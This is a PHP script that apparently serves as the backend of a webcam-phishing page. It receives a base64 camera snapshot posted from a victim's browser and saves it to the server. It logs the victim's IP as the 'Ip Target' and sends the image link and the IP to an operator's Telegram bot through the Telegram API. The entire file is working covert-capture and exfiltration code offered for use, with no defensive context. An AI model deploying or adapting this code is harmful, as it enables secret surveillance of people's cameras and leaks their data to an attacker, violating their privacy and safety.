<?php
include('config.php');
if ( 'POST' != $_SERVER['REQUEST_METHOD'] ) {
	$protocol = $_SERVER['SERVER_PROTOCOL'];
	if ( ! in_array( $protocol, array( 'HTTP/1.1', 'HTTP/2', 'HTTP/2.0' ) ) ) {
		$protocol = 'HTTP/1.0';
	}

	header( 'Allow: POST' );
	header( "$protocol 405 Method Not Allowed" );
	header("location:index.html");
	header( 'Content-Type: text/plain' );
	exit;
}


$cod=rand(1,1000);
$imageData=$_POST['cat'];

if (!empty($_POST['cat'])) {
error_log("Received" . "\r\n", 3, "Log.log");

}

$filteredData=substr($imageData, strpos($imageData, ",")+1);
$unencodedData=base64_decode($filteredData);
$fp = fopen( 'cam'.$cod.'.png', 'wb' );
fwrite( $fp, $unencodedData);
fclose( $fp );

$X="$host/cam$cod.png";
$ip = $_SERVER['REMOTE_ADDR'];
$Text="

>>> Ip Target : $ip <<<
=========================
###   $X   ###

";

 file_get_contents("https://api.telegram.org/bot".$token."/SendMessage?chat_id=".$admin."&text=".urlencode($Text));
 
exit();
?>
